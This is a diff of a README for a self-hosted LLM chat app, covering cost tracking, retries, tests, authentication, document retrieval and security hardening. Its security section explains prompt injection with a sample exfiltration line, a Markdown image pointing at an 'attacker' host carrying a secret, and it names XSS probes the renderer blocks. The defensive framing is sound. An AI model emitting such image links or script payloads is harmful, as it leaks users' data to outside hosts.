+`#/usage` (sidebar link) shows the last 7 / 30 / 90 days: total spend (USD with INR), tokens, cache hit rate, money saved by caching, web searches, a daily-spend chart, spend by purpose (replies / chat titles / memory summaries / document indexing), spend by model and the most expensive chats. Everything comes from the signed-in user's stored rows: replies carry their own usage and cost, and title, summary and embedding calls are in `llm_calls`. A call with no configured price is counted as *unpriced* and the total is flagged as a lower bound, never counted as $0. Days follow the browser's clock (it sends its UTC offset). Deleting a chat removes its content but **not its cost**: each reply's usage numbers (tokens, cost, searches, original date; never the text) are copied to `archived_replies` in the same transaction, so spend history stays true. A deleted chat just can't appear in "most expensive chats", since there is nothing left to link to.
 
 ## Cost accounting
 
@@ -488,7 +610,7 @@ Example (`gpt-5.6-luna`: $0.20 input, $0.02 cached input, $1.20 output per 1M), 
 Rules the code enforces (each has tests):
 - cached tokens are charged at the cached rate and **never also** at the normal input rate;
 - reasoning tokens are already inside `output_tokens`, so they are **not added again**;
-- arithmetic uses `Decimal`, converted to float only for JSON/SQLite;
+- arithmetic uses `Decimal`, converted to float only for JSON and storage;
 - the price entry is looked up by the **served** model; a dated snapshot of a priced alias (`<alias>-YYYY-MM-DD`) uses the alias price; **any other model → `cost = null` + a warning** `Pricing not configured for model: …`. The reply still succeeds. A wrong number in a cost UI is worse than a blank;
 - cached tokens reported for a model with no `cached_input` price → cost left unknown (no guessing).
 
@@ -504,9 +626,9 @@ The `gpt-5.6-luna` and `gpt-5.4-mini` entries were supplied by the project owner
 
 **INR next to USD.** OpenAI bills in USD, so USD is the stored, real amount. The UI shows an INR equivalent beside every cost (per reply and conversation total), computed with `USD_TO_INR`: `auto` fetches the current market rate from a free public API (`AI/app/core/fx.py`, cached 6 hours, falls back to `USD_TO_INR_FALLBACK` if the lookup fails, and never breaks the app). Hover the cost to see the rate, its source (`live`/`fallback`/`fixed`) and timestamp. It is a display conversion only, not what your card or bank will charge. The rate was about ₹96.4/$ on 2026-10-06; a hardcoded value goes stale.
 
-**UI:** each reply shows `Input: N tokens sent (K cached)`, `Output: N tokens received (R reasoning)`, total and `Cost: $… · ₹…`; the conversation header shows total input, output, total tokens and cost. The conversation cost is `SUM(cost_usd)` over stored message costs; unpriced replies are excluded and counted in `unpriced_messages` (so the total is labelled as incomplete). Title-generation calls are not attributed to any message. Costs are floats in SQLite (use integer micro-dollars for invoicing).
+**UI:** each reply shows `Input: N tokens sent (K cached)`, `Output: N tokens received (R reasoning)`, total and `Cost: $… · ₹…`; the conversation header shows total input, output, total tokens and cost. The conversation cost is `SUM(cost_usd)` over stored message costs; unpriced replies are excluded and counted in `unpriced_messages` (so the total is labelled as incomplete). Title-generation calls are not attributed to any message. Costs are stored as floats (use integer micro-dollars for invoicing).
 
-**Existing databases:** `Database.init_schema()` adds the new columns (`cached_input_tokens`, `reasoning_tokens`, `served_model`) to older database files automatically.
+**Existing databases:** `Database.init_schema()` runs any migrations the database has not seen yet (see *Database schema*), so an older database is brought up to date at startup.
 
 ## Retry behavior
 
@@ -522,8 +644,6 @@ The `gpt-5.6-luna` and `gpt-5.4-mini` entries were supplied by the project owner
 Transient = connection errors/timeouts, 5xx, 408/409, and 429 *rate limits* (but **not** `insufficient_quota`: out of money isn't transient).
 
 **Why never after the first token?** The user (and the database) already hold `"Hello my"`. A new attempt generates its own answer from the start, and generation is sampled, so it will not reproduce the same words. Appending gives `"Hello myHello my name is…"`; replacing makes visible text vanish. Neither is correct, so we stop. Also, the SDK's own retries are disabled (`max_retries=0`) because the SDK can't know whether tokens already reached the user. Retried attempts can also be billed, another reason to keep the count small.
-
-Try it free: `/flaky` (retried, succeeds), `/down` (exhausts), `/fail` (retryable error but *not* retried because text was sent).
 
 ## Cancellation
 
@@ -551,8 +671,9 @@ Caveat to know: tokens generated *before* the provider noticed the disconnect ma
 ## Testing
 
 ```bash
-cd AI && source .venv/bin/activate && pytest -q          # 160+ tests, ~3 s, no network
-cd frontend && npm run typecheck && npm test                   # TS typecheck + 8 SSE parser tests
+docker compose up -d postgres                                  # the tests use a real PostgreSQL (one throwaway database per test)
+cd AI && source .venv/bin/activate && pytest -q                # 440+ tests, ~25 s, no OpenAI
+cd frontend && npm run typecheck && npm test                   # TS typecheck + 70 unit tests
 ```
 
 | File | Covers |
@@ -569,30 +690,40 @@ cd frontend && npm run typecheck && npm test                   # TS typecheck + 
 | `test_web_search.py` | Tavily parsing, URL filtering, safe errors, citation numbering across searches |
 | `test_api.py` | endpoints, history reaches the model, titles, 413/422/409/429, restart persistence |
 | `test_cancellation_live.py` | real Uvicorn + real TCP disconnect |
+| `test_migrations.py` | the migration runner: numbering, applying only what is missing, running twice is a no-op, a failing file leaves nothing behind |
+| `test_auth.py` | passwords, JWT (expiry, tampering, `alg: none`), signup/login, rate limit, and a walk of **every route** proving it needs a token; users cannot see each other's chats or usage, and the chat rate limit is per user |
+| `test_cli.py` | `create-user`, `claim-legacy`, `import-sqlite` |
+| `test_rag_extract.py` | PDF/DOCX/text/Markdown reading, refusals (wrong type, disguised files, zip bombs, encrypted or empty PDFs) |
+| `test_rag_chunker.py` | chunk size, whole paragraphs, overlap, page and heading tracking, sentence splitting |
+| `test_rag_store.py` | chunk storage and **hybrid search** against real pgvector: ranking, isolation between chats and users, cascades, atomic writes |
+| `test_rag_ingest.py` | background indexing outcomes, the OpenAI embedder (batching, retries, bad responses), the document tool, shared `[n]` numbering |
+| `test_attachments_api.py` | upload/list/delete over HTTP, limits (415/413/409/429), another user's access, and a full "ask about the file, get a cited answer" round trip |
 | `test_limits_config.py` | rate limiter, config validation |
 
-**Unit tests never call OpenAI.** They use a scripted stub: *fast and deterministic*. Real-API tests are *slow, expensive and network-dependent*. A `conftest.py` safety net makes any accidental real network call from the OpenAI SDK **fail the test** instead of spending money. I also sabotaged the production code (dropping the partial-text save, dropping the stream close) to confirm those tests actually fail.
+**Unit tests never call OpenAI.** They use a scripted stub and a fake embedder (hashed bag-of-words vectors, so retrieval is testable end to end): *fast and deterministic*. Real-API tests are *slow, expensive and network-dependent*. A `conftest.py` safety net makes any accidental real network call from the OpenAI SDK **fail the test** instead of spending money. I also sabotaged the production code (dropping the partial-text save, dropping the stream close) to confirm those tests actually fail.
 
 ## Security
 
 - **API key:** only in the server's env/`.env` (git-ignored). The browser talks to FastAPI, never to OpenAI. The Vite bundle contains no secret (anything `VITE_*` is public).
 - **Input size:** `MAX_MESSAGE_CHARS` (413) plus a pure-ASGI body cap checked from `Content-Length` before the body is read. Why: abuse and **cost** (input tokens are money), **context overflow**, and denial of service. (A chunked request has no `Content-Length`; in production also cap at the reverse proxy.)
-- **Rate limiting:** minimal in-memory sliding window per IP (429). Production: per-user, shared store (see below).
+- **Authentication and isolation:** see *Accounts and authentication*. Chat and upload limits are per user, login attempts per IP (in-memory sliding windows; use a shared store with several servers).
 - **One reply at a time per conversation** (409): prevents interleaved generations.
 - **Logging:** structured `key=value` lines with ids, model, tokens, cost, latency, status, error *type*. **Conversation text is never logged by default**: prompts routinely contain personal or confidential data, and logs are widely accessible and long-lived.
 - **Safe errors:** raw exception text never reaches the browser.
 - **LLM output is untrusted.** It can be steered by whatever the model read (prompt injection). `Message.tsx` renders Markdown with `react-markdown` (no `dangerouslySetInnerHTML`, raw HTML shown as inert text, `javascript:` URLs stripped), **removes images** (a rendered `![](https://attacker/?q=<secret>)` makes the browser exfiltrate data), and opens links with `rel="noopener noreferrer"`. Verified in a real browser: `<img onerror>`, `<script>`, `javascript:` links and remote images produce no elements and no alert.
-- **Prompt injection (general):** treat both user input *and* model output as untrusted; never give the model authority the user doesn't have; this app has no tools or retrieval, which is what keeps the blast radius small.
+- **Prompt injection (general):** treat user input, model output *and the text of uploaded documents or web pages* as untrusted. The model has two read-only tools (web search, search of the current chat's own files), no write access and no way to reach another user's data (retrieval is scoped in SQL), which keeps the blast radius small. Document text is labelled as data in the instructions; that reduces, but does not eliminate, the risk.
+- **Uploads:** extension allowlist + magic bytes, byte cap enforced before and while reading, limits on pages / characters / chunks, zip-bomb guard, sanitised filename (path parts stripped), parsing in a worker thread, and a safe message instead of a stack trace for a broken file.
 - **SQL:** all values are bound parameters; the one dynamic part (column names in `update_message`) is whitelisted.
 
 ## Production improvements
 
 Not implemented, on purpose: they are separate lessons.
 
-- **Auth & multi-tenancy:** users, `conversations.user_id`, authorization on every route (today anyone who can reach the API sees all conversations).
-- **Database:** PostgreSQL (many writers, replication, real migrations such as Alembic) instead of single-file SQLite; async driver.
-- **Rate limiting & quotas:** per-user token/cost budgets, shared store (Redis) or at the API gateway; trusted `X-Forwarded-For`.
-- **Exact token counting** with the model's tokenizer; running-summary memory for long chats.
+- **Sessions:** refresh tokens and server-side revocation (a 7-day JWT cannot be cancelled early), an `httpOnly` cookie instead of `localStorage`, email verification and password reset, OAuth login, per-account lockout.
+- **Database:** a read replica or managed PostgreSQL, an async driver, backups; roles and row-level security as a second line of defence behind the `user_id` filters.
+- **Rate limiting & quotas:** per-user token/cost budgets and shared limiter state (Redis) or at the API gateway; trusted `X-Forwarded-For`.
+- **Retrieval quality:** a re-ranking step, evaluation sets (hit rate / MRR on real documents), OCR for scanned PDFs, more file types, indexing in a separate worker queue so a restart never interrupts it.
+- **Exact token counting** with the model's tokenizer.
 - **Observability:** OpenTelemetry traces, Prometheus metrics, alerting on time-to-first-token and error rate, spend alerts.
 - **Proxy hygiene:** disable response buffering for `text/event-stream` (we send `X-Accel-Buffering: no`), idle/keep-alive comments, request-size limits at the edge.
 - **Resumable streams / multi-instance:** run workers behind a queue with a stream-id so a reconnect can resume instead of losing the reply.
@@ -603,7 +734,11 @@ Not implemented, on purpose: they are separate lessons.
 
 | Symptom | Cause / fix |
 |---|---|
-| Server exits: "Cannot start, fix the configuration" | set `OPENAI_API_KEY` and `OPENAI_MODEL` in `.env` |
+| Server exits: "Cannot start, fix the configuration" | set `OPENAI_API_KEY`, `OPENAI_MODEL` and a `JWT_SECRET` (32+ characters) in `.env` |
+| "Cannot reach PostgreSQL" / tests exit immediately | start the database: `docker compose up -d postgres` (`./run.sh` does it for you) |
+| Everything returns 401 / the login screen keeps appearing | the token expired, or `JWT_SECRET` changed (it invalidates every login): sign in again |
+| An attached file shows "failed" | hover the chip for the reason (unreadable PDF, no text, too large); scanned PDFs need OCR, which is not included |
+| Old chats are missing after the upgrade | they were in the SQLite file: `python -m app.cli import-sqlite data/chat.db you@example.com` |
 | UI says "Could not reach the server" | backend not running on `:8501` (or set `VITE_API_URL`) |
 | Costs show "cost n/a" | the model has no entry in `AI/data/prices.toml` |
 | Vite starts on a different port | port 3100 is busy; fine (dev CORS allows any localhost port) |
